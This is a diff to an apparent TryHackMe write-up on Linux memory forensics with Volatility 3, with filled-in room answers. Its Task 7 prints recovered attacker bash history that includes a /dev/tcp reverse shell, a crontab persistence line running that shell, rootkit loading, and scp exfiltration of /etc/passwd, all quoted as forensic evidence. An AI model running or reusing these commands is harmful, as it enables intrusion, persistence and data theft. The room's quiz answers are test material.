@@ -5,7 +5,7 @@ June 12, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.
 and I’m excited to join you on this adventure,<br>
 part of my <code>402</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
 Identify C2 traffic & post-exploit activity in Windows memory.<a href="https://tryhackme.com/room/windowsmemoryandnetwork"</a>here.<br>
-<img width="1200px" src="https://github.com/user-attachments/assets/2179ec73-213f-4b57-9115-4ae96682c9b9"></p>
+<img width="1200px" src="https://github.com/user-attachments/assets/5e60674d-8cac-45f1-9dfd-3d8df4aa1bdb"></p>
 
 <h2> Task 1 . Introduction</h2>
 
@@ -610,20 +610,180 @@ Examine the network connections and see if you can find any suspicious connectio
 
 ![image](https://github.com/user-attachments/assets/03eabeff-e069-42d6-9a10-846e9f8a4df3)
 
-
 <br>
 
 > 6.4. <em>What is the port number opened for the reverse shell by the adversary on the infected host?</em><br><a id='6.4'></a>
->> <strong><code>_____</code></strong><br>
+>> <strong><code>9898</code></strong><br>
 <p></p>
 
+![image](https://github.com/user-attachments/assets/bd7d3846-cfe7-4e0d-9435-79b3a06a9e3a)
 
 <br>
 
 <h2> Task 7 . Hunting for User Activities</h2>
+<p>When a system is compromised, attackers typically interact with it through command-line tools like bash, sh, or python. Their footprints are often left behind in memory long after processes have terminated. By analyzing shell history, terminal usage, and related metadata, we can reconstruct what commands were run, by whom, and in what context.</p>
+
+<h3>Bash History</h3>
+
+<p>We can use the following command to locate the footprints of the command history from users’ Bash sessions (.bash_history or in-memory structures), offering direct insight into what actions a user performed.<br><br>
+
+Command: vol3 -f FS-01.mem linux.bash.Bash</p>
+
+<p>Bash History</p>
+
+```bash
+ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.bash.Bash
+Volatility 3 Framework 2.26.2
+PID    Process    CommandTime    Command
+14165    bash    2025-06-02 10:12:47.000000 UTC    useradd [REDACTED] -m -s /bin/bash
+14165    bash    2025-06-02 10:13:07.000000 UTC    /sbin/useradd [REDACTED] -m -s /bin/bash
+14165    bash    2025-06-02 10:13:10.000000 UTC    sudo su
+14204    bash    2025-06-02 10:13:35.000000 UTC    /sbin/useradd [REDACTED] -m -s /bin/bash
+14204    bash    2025-06-02 10:14:19.000000 UTC    echo '[REDACTED]secretP2ssw0rd!' | chpasswd
+14204    bash    2025-06-02 10:14:33.000000 UTC    usermod -aG sudo [REDACTED]
+14204    bash    2025-06-02 10:15:02.000000 UTC    mkdir /home/[REDACTED]/.ssh
+14204    bash    2025-06-02 10:15:53.000000 UTC    sudo su - [REDACTED]
+14204    bash    2025-06-02 10:34:33.000000 UTC    bash -i >& /dev/tcp/10.12.14.32/4567 0>&1
+14204    bash    2025-06-02 10:51:34.000000 UTC    mkdir /tmp
+14204    bash    2025-06-02 10:51:41.000000 UTC    cd /tmp/
+14204    bash    2025-06-02 10:51:42.000000 UTC    ls
+14801    bash    2025-06-02 10:36:23.000000 UTC    sudo su
+14801    bash    2025-06-02 10:36:23.000000 UTC    Pf[
+14847    bash    2025-06-02 10:36:27.000000 UTC    echo "* * * * * root bash -i >& /dev/tcp/10.12.14.32/4567 0>&1" >> /etc/crontab
+14847    bash    2025-06-02 10:37:02.000000 UTC    isnmod rootkit.ko
+14847    bash    2025-06-02 10:37:11.000000 UTC    insmod rootkit.ko
+14847    bash    2025-06-02 10:39:46.000000 UTC    chmod +x /dev/shm/.runme.sh
+14847    bash    2025-06-02 10:39:51.000000 UTC    /dev/shm/.runme.sh
+14847    bash    2025-06-02 10:41:17.000000 UTC    scp /etc/passwd root@10.10.34.91:/home/
+```
+
+
+<p>The command's output is already placed in the bash_output file. The output shows the commands the user ran in the bash terminal. Some of the suspicious commands executed were related to suspicious account creation, SSH setup, setting up a cron job, etc.</p>
+
+<h5>Forensic Value</h5>
+
+<p>
+
+- Reveals attacker behavior in plaintext.<br>
+- Identifies credential theft, persistence mechanisms, and payload execution.<br>
+- Even if history is wiped from disk, memory can preserve it.</p>
+
+<h3>Check Environment Variables</h3>
+
+<p>We can also extract the traces of the environment variables from the memory. This may be useful if the attacker has planted suspicious binaries in a custom location and altered the PATH variable to prioritize the execution.<br><br>
+
+Command: vol3 -f FS-01.mem linux.envars.Envars</p>
+
+<p>Checking Environment Variables</p>
+
+```bash
+ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.envars.Envars
+Volatility 3 Framework 2.26.2
+PID    PPID    COMM    KEY    VALUE
+1    0    systemd    HOME    /
+1    0    systemd    TERM    linux
+1    0    systemd    BOOT_IMAGE    /boot/vmlinuz-5.15.0-1066-aws
+170    1    systemd-journal    LANG    C.UTF-8
+170    1    systemd-journal    PATH    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+170    1    systemd-journal    NOTIFY_SOCKET    /run/systemd/notify
+```
+
+<p>The command's output is already placed in the envars_output file.</p>
+
+<h5>Forensics Value:</h5>
+
+- Reveals execution context of processes, including directories, shells, and user settings.<br>
+- Detects malicious environment manipulation, such as modified PATH.<br>
+- Uncovers persistence mechanisms through environment-based startup configurations.<br>
+- Correlates with other process artifacts to enrich the investigation context.</p>
+
+<p>In conclusion, understanding user behavior is critical for identifying unauthorized access, malicious actions, and post-exploitation traces.</p>
+
+<h3 align="left"> Answer the questions below</h3>
+
+> 7.1. <em>The network team has detected a suspicious attempt to create a new account on the system. Can you investigate and find the name of the backdoor account created?</em><br><a id='7.1'></a>
+>> <strong><code>james</code></strong><br>
+<p></p>
+
+![image](https://github.com/user-attachments/assets/606993b9-2a94-44fd-95ce-a9c3af4bae39)
+
+
+<br>
+
+> 7.2. <em>The bash history shows a suspicious command that established a reverse shell. What is the attacker's IP address?</em><br><a id='7.2'></a>
+>> <strong><code>10.12.14.32</code></strong><br>
+<p></p>
+
+![image](https://github.com/user-attachments/assets/2dda16cd-6ed5-46e8-bbae-ae2f9298120e)
 
 <br>
 
 <h2> Task 8 . Conclusion</h2>
 
+<p>That's it.<br><br>
 
+In this room, we examined a Linux memory dump to look for the footprints of the adversary on the compromised Linux host. Some of the key points we covered are:<br><br>
+
+- Identify suspicious process.<br>
+- Identify the hidden process running from the tmp directory.<br>
+- Examine the processes with suspicious arguments.<br>
+- Examine the bash history.<br>
+- Explore network connections and identify reverse shell connections.</p>
+
+<p>You can learn more about forensics in the following rooms:<br>
+
+- Linux Logs Investigation<br>
+- Linux Process Analysis<br>
+- Linux Forensics</p>
+
+<p>Happy Learning!</p>
+
+<h3 align="left"> Answer the questions below</h3>
+
+> 8.1. <em>Continue to complete the room.</em><br><a id='8.1'></a>
+>> <strong><code>No answer needed</code></strong><br>
+<p></p>
+
+<br>
+
+> 8.2. <em>Don't forget to close the machine attached to the room.</em><br><a id='8.2'></a>
+>> <strong><code>No answer needed</code></strong><br>
+<p></p>
+
+<br>
+<br>
+
+<h1 align="center">Room Completed</h1>
+<br>
+<p align="center"><img width="1000px" src="https://github.com/user-attachments/assets/beaddb75-5e0b-4895-8234-0e44d4530494"><br>
+                  <img width="1000px" src="https://github.com/user-attachments/assets/971d6144-b86a-4547-8999-7fe5d94a9742"></p>
+
+<h1 align="center"> My TryHackMe Journey</h1>
+<br>
+
+<div align="center">
+
+| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
+| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
+| June 11 2025      | 401      |     204ᵗʰ    |      4ᵗʰ     |     721ˢᵗ   |    15ᵗʰ    |  107,051  |    773    |     60    |
+
+</div>
+
+<p align="center"> Global All Time:  204ᵗʰ<br><br>
+<img width="240px" src="https://github.com/user-attachments/assets/e2dbc695-ba3c-4d5e-badc-6305ef0f6688"><br>
+<img width="1000px" src="https://github.com/user-attachments/assets/799b2dc8-a596-4b43-8457-3a597f3261ed"> </p>
+
+<p align="center"> Brazil All Time:    4ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/89053e09-b1cd-45f0-8dea-d1e98862d74e"> </p>
+"> </p>
+
+<p align="center"> Global monthly:    721ˢᵗ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/60a3f005-9d8e-43cb-86a1-6d2e62b3e4c5"> </p>
+
+<p align="center"> Brazil monthly:    15ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/b77b4e0d-751a-46ad-af56-2511e8aa85fe"> </p>
+
+<h1 align="center">Thanks for coming!!!</h1>
+
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
+
+<h1 align="center">Thank you</h1>
+<p align="center"><a href="https://tryhackme.com/p/Dex01">Dex01</a>  for investing your time and effort to develop this challenge so that I could sharpen my skills!</p> 
